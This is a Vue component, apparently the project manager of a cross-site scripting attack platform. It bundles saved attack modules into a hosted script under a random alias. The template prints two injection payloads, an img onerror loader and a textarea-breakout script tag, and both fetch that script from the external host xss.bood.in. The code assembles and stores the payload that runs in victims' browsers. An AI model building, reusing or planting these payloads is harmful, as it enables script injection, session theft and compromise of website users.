<style>
.project-content {
    display: flex;
}
.card {
    overflow-y: auto; 
    position: relative;
    display: inline-block;
    width: 20rem;
    height: calc(100vh - 6rem);
    background: #fff;
    border-radius: 2px;
    padding: 0 0 1rem 0;
    box-sizing: border-box;
    box-shadow: 0 0 .5rem #d0d0d0;
    flex-shrink: 0;
}
.card-title {
    display: flex;
    justify-content: space-between;
    font-size: 1.2rem;
    color: #545454;
    margin-bottom: 1rem;
    padding: 1rem;
    line-height: 1.6rem;
}
.card-title-btn {
    height: 1.6rem;
    min-width: 4rem;
    padding: 0 1rem;
    line-height: 1rem;
    background: none;
    border: 1px solid #51d79d;
    border-radius: 1rem;
    color: #51d79d;
    outline: none;
}
.card-title-btn.common {
    color: #777777;
    border: 1px solid #777777;
}
.card-title-btn.disable {
    color: #ccc;
    border: 1px solid #ccc;
}
.project-list {
    list-style: none;
}
.project-list-item {
    color: #868686;
    border-left: 4px solid #CDDC39;
    cursor: pointer;
    padding: .75rem 1rem;
    margin-bottom: .5rem;
}
.project-list-item:hover {
    background-color: #eee;
}
.item-title {
    margin-bottom: .5rem;
    font-size: 1rem;
    color: #000;
}
.item-other {
    font-size: .6rem;
    display: flex;
    justify-content: space-between;
}
.project-view {
    width: 100%;
    background: #fff;
    margin-left: 1rem;
    box-shadow: 0 0 .5rem #d0d0d0;
}
.project-new-title-box {
    width: 100%;
    padding-right: 1rem;
    margin-right: 1rem;
}
.project-new-title {
    border: none;
    border-bottom: 1px solid #ccc;
    outline: none;
    font-size: 1rem;
    padding: .2rem .5rem;
    width: 100%;
}
.project-new-content {
    height: calc(100% - 6rem);
    padding: 0 1rem;
}
.module-edit-textarea {
    height: 100%;
    width: 100%;
    border: 1px solid #e8e8e8;
    background: #f7f7f7;
    line-height: 1.7;
    color: #717171;
    outline: none;
}
.module-edit-action {
    text-align: right;
    flex-shrink: 0;
}
.text-row {
    padding: 0 .5rem;
    margin-bottom: 1rem;
    display: flex;
}
.text-row-title {
    min-width: 4rem;
    font-size: 1rem;
    line-height: 1.7rem;
    text-align: right;
    flex-shrink: 0;
    padding-right: 1rem;
}
.text-row-input {
    border: none;
    border-bottom: 1px solid #ccc;
    outline: none;
    font-size: 1rem;
    padding: .25rem;
    width: 100%;
}
.code-block {
    background: #ececec;
    padding: .5rem 1rem;
    font-size: .8rem;
    margin-bottom: 1rem;
}
</style>

<template>
    <div class="project-content">
        <div class="card">
            <div class="card-title">
                <span>项目</span>
                <button class="card-title-btn" @click="showNew">创建</button>
            </div>
            <div class="card-content">
                <ul class="project-list">
                    <li class="project-list-item" v-for="item in list" @click="showProject(item)">
                        <div class="item-title">
                            {{item.get('title')}}
                        </div> 
                        <div class="item-other">
                            <div class="item-quote">
                                <span class="module-tag">{{item.get('summary')}}</span>
                            </div>
                            <div class="item-date">
                                {{item.updatedAt | timeAgo}}
                            </div>
                        </div>
                    </li>
                </ul>
            </div>
        </div>
        <div class="project-new project-view">
            <div class="card-title">
                <div class="project-new-title-box">
                    {{edit.title}}
                </div>
                <div class="project-new-action">
                    <button class="card-title-btn" @click="saveAction">保存</button>
                </div>
            </div>
            <div class="module-edit-content">
                <div class="text-row">
                    <div class="text-row-title">项目名</div>
                    <input type="text" class="text-row-input" v-model="edit.title">
                </div>
                <div class="text-row">
                    <div class="text-row-title">备注</div>
                    <input type="text" class="text-row-input" v-model="edit.summary">
                </div>
                <div class="text-row">
                    <div class="text-row-title">模块</div>
                    <cov-select :select="select"></cov-select>
                </div>
                <div class="text-row" v-if="edit.alias">
                    <div class="text-row-title">接口地址</div>
                    <p>{{edit.alias}}</p>
                </div>
                <div v-if="edit.alias">
                    <p class="code-block">
                    {{ `&lt;img src=x onerror=s=createElement('script');body.appendChild(s);s.src='http://xss.bood.in/code?id=${edit.alias}';&gt;`}}
                    </p>
                    <p class="code-block">
                        {{`&lt;/textarea&gt;'"&gt;&lt;script src=http://xss.bood.in/code?id=${edit.alias}&gt;&lt;/script&gt;`}}
                    </p>
                </div>
                
            </div>
        </div>
    </div>
</template>

<script>
import covSelect from '../components/select.vue'
import MD5 from 'md5'

export default {
    data () {
        return {
            list: [],
            edit: {
                project: null,
                title: '',
                summary: '',
                alias: ''
            },
            select: {
                remove: [],
                value: [],
                options: []
            }
        }
    },
    mounted () {
        this.queryList()
        this.queryModule()
    },
    components: {
        covSelect
    },
    methods: {
        showNew () {
            this.edit.project = null
            this.edit.title = ''
            this.edit.summary = ''
            this.edit.alias = ''
            this.select.value = []
            this.select.remove = []
        },
        showProject (item) {
            this.edit.project = item
            this.edit.title = item.get('title')
            this.edit.summary = item.get('summary')
            this.edit.alias = item.get('alias')

            let query = item.relation('Module').query()

            this.queryModule(() => {
                query.find()
                    .then(list => {
                        list.forEach(item => {
                            this.select.options.forEach(op => {
                                if (op.item.id === item.id) {
                                    op.selected = true
                                    this.select.value.push(op)
                                }
                            })
                        })
                    })
            })
            
        },
        queryList () {
            const query = new AV.Query('Project')
            query.equalTo('creator', AV.User.current())
            query.include('creator')
            query.include('Module')
            query.find()
                .then(list => {
                    this.list = list
                })
        },
        queryModule (cb) {
            this.select.value = []
            this.select.remove = []
            const query = new AV.Query('Module')
            query.equalTo('creator', AV.User.current())
            query.include('creator')
            query.find()
                .then(list => {
                    this.select.options = list.map(item => {
                        return {
                            text: item.get('title'),
                            item: item,
                            selected: false
                        }
                    })
                    if (cb) cb()
                })
        },
        saveAction () {
            if (!this.edit.title || !this.edit.summary) return
            this.create(this.edit.title, this.edit.summary, this.select.value, this.select.remove, this.edit.project)
        },
        genAlias () {
            let raw = Math.random() * (new Date()).getTime()
            if (window.performance) {
                raw += window.performance.timing.connectEnd
            }
            return MD5(raw)
        },
        genCode (alias, modules) {
            let result = ''
            modules.forEach(m => {
                result += m.item.get('code')
            })
            return result
        },
        delCache (id) {
            this.$http.get('/code/fresh', {
                params: {
                    id: id
                }
            })
            .then(res => {
                console.log('mission success')
            })
        },
        create (title, summary, modules, removed, current) {
            const Project = AV.Object.extend('Project')
            let alias = ''
            if (!current) {
                current = new Project()
                alias = this.genAlias()
            } else {
                alias = current.get('alias')
            }

            let moduleRlt = current.relation('Module')

            removed.forEach(m => {
                moduleRlt.remove(m.item)
            })
            modules.forEach(m => {
                moduleRlt.add(m.item)
            })
            
            current.save({
                title: title,
                summary: summary,
                alias: alias,
                code: this.genCode(alias, modules),
                creator: AV.User.current()
            })
            .then(module => {
                this.edit.alias = alias
                this.queryList()
                this.delCache(alias)
            })
        }
    }
} 
</script>